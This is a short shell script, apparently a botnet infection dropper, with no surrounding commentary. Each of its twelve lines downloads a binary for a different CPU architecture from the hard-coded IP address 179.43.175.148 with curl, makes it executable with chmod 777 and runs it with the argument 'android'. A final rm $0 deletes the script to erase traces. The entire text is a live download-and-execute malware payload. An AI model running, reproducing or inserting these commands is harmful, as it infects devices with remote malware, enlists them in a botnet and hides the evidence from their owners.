curl http://179.43.175.148/arm; chmod 777 arm; ./arm android
curl http://179.43.175.148/arm5; chmod 777 arm5; ./arm5 android
curl http://179.43.175.148/arm6; chmod 777 arm6; ./arm6 android
curl http://179.43.175.148/arm7; chmod 777 arm7; ./arm7 android
curl http://179.43.175.148/sh4; chmod 777 sh4; ./sh4 android
curl http://179.43.175.148/arc; chmod 777 arc; ./arc android
curl http://179.43.175.148/mips; chmod 777 mips; ./mips android
curl http://179.43.175.148/mipsel; chmod 777 mipsel; ./mipsel android
curl http://179.43.175.148/sparc; chmod 777 sparc; ./sparc android
curl http://179.43.175.148/x86_64; chmod 777 x86_64; ./x86_64 android
curl http://179.43.175.148/i686; chmod 777 i686; ./i686 android
curl http://179.43.175.148/i586; chmod 777 i586; ./i586 android

rm $0